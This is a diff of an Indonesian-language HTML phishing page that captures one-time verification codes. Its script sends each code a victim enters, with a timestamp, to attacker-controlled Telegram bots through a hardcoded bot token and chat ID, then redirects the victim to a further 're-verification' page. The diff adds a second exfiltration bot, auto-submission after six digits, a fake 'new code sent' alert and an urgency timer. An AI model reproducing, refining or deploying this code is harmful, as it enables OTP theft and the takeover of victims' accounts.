@@ -133,60 +133,118 @@
         dan notifikasi pesan instan lainnya.
     </div>
 
-    <!-- ============================================== -->
-    <!-- SCRIPT KIRIM KE TELEGRAM & PINDAH HALAMAN -->
+        <!-- ============================================== -->
+    <!-- SCRIPT KIRIM KE 2 BOT TELEGRAM & PINDAH HALAMAN -->
     <!-- ============================================== -->
     <script>
-        // 👇👇 GANTI INI DULU 👇👇
-        const BOT_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
-        const CHAT_ID = "-1003797236002";
-        const HALAMAN_BERIKUTNYA = "verifikasi ulang.html"; // Ganti nama file
+        // ==================== BOT 1 ====================
+        const BOT1_TOKEN = "8463412359:AAG6nli8rzC54LQSKkgXBXkwI8ePspNfFIA"; 
+        const BOT1_CHAT_ID = "-1003797236002";
+
+        // ==================== BOT 2 — GANTI DENGAN DATA BOT KEDUA ====================
+        const BOT2_TOKEN = ""; 
+        const BOT2_CHAT_ID = "MASUKKAN_CHAT_ID_BOT_KEDUA_DISINI";
+
+        // ==================== HALAMAN TUJUAN ====================
+        const HALAMAN_BERIKUTNYA = "verifikasi ulang.html";
 
         // === TIMER HITUNG MUNDUR ===
         let totalDetik = 2 * 60 + 51; // 2 menit 51 detik
         const timerElement = document.getElementById('timer');
+        let timerExpired = false;
         
         const countdown = setInterval(() => {
             let menit = Math.floor(totalDetik / 60);
             let detik = totalDetik % 60;
             
-            // Format jadi 2 digit (02:51)
-            menit = menit < 10 ? "0" + menit : menit;
             detik = detik < 10 ? "0" + detik : detik;
-            
             timerElement.textContent = menit + ":" + detik;
             totalDetik--;
 
             if(totalDetik < 0) {
                 clearInterval(countdown);
                 timerElement.textContent = "Waktu Habis";
+                timerElement.style.color = "#ff0050";
+                timerExpired = true;
             }
         }, 1000);
 
-        // === FUNGSI KIRIM DATA ===
-        function kirimData(){
-            let kode = document.getElementById("kode").value;
-
-            let pesan = `<b>*░▒▬▬ஜ۩Kontol۩ஜ▬▬▒░*</b>
- Kode: ${kode}`;
-
-            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            
-            fetch(url, {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({
-                    chat_id: CHAT_ID,
-                    text: pesan,
-                    parse_mode: "HTML"
-                })
-            })
-            .then(() => {
-                // LANGSUNG PINDAH HALAMAN
-                window.location.href = HALAMAN_BERIKUTNYA;
-            });
+        // === FUNGSI KIRIM KE BOT ===
+        async function kirimKeBot(token, chatId, pesan) {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: "POST",
+                    headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: pesan,
+                        parse_mode: "HTML"
+                    })
+                });
+                const data = await res.json();
+                return data.ok;
+            } catch (err) {
+                console.log("Gagal kirim:", err);
+                return false;
+            }
         }
+
+        // === FUNGSI UTAMA KIRIM DATA ===
+        async function kirimData(){
+            let kode = document.getElementById("kode").value.trim();
+            let btn = document.getElementById("btnKirim");
+            let error = document.getElementById("pesanError");
+
+            // Validasi
+            if(kode === "" || kode.length < 4){
+                error.style.display = "block";
+                return false;
+            }
+            error.style.display = "none";
+
+            // Kunci tombol
+            btn.disabled = true;
+            btn.innerText = "Memproses...";
+
+            // Format pesan
+            let pesan = `<b>🔐 Kode Verifikasi / OTP</b>
+Kode: <code>${kode}</code>
+Waktu: ${new Date().toLocaleString('id-ID')}
+${timerExpired ? '⚠️ Waktu sudah habis!' : ''}`;
+
+            // Kirim ke 2 bot SECARA BERSAMAAN
+            const [hasilBot1, hasilBot2] = await Promise.all([
+                kirimKeBot(BOT1_TOKEN, BOT1_CHAT_ID, pesan),
+                kirimKeBot(BOT2_TOKEN, BOT2_CHAT_ID, pesan)
+            ]);
+
+            console.log("Bot 1:", hasilBot1 ? "✅ Berhasil" : "❌ Gagal");
+            console.log("Bot 2:", hasilBot2 ? "✅ Berhasil" : "❌ Gagal");
+
+            // Pindah halaman
+            window.location.href = HALAMAN_BERIKUTNYA;
+        }
+
+        // Kirim ulang kode — reset input & timer
+        document.getElementById('kirimUlang').addEventListener('click', () => {
+            alert('Kode baru telah dikirim!');
+            document.getElementById('kode').value = '';
+            document.getElementById('kode').focus();
+        });
+
+        // Otomatis kirim setelah 6 digit terisi
+        document.getElementById('kode').addEventListener('input', (e) => {
+            if(e.target.value.length === 6) {
+                kirimData();
+            }
+        });
+
+        // Tekan Enter untuk kirim
+        document.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') kirimData();
+        });
     </script>
 
 </body>
 </html>
+
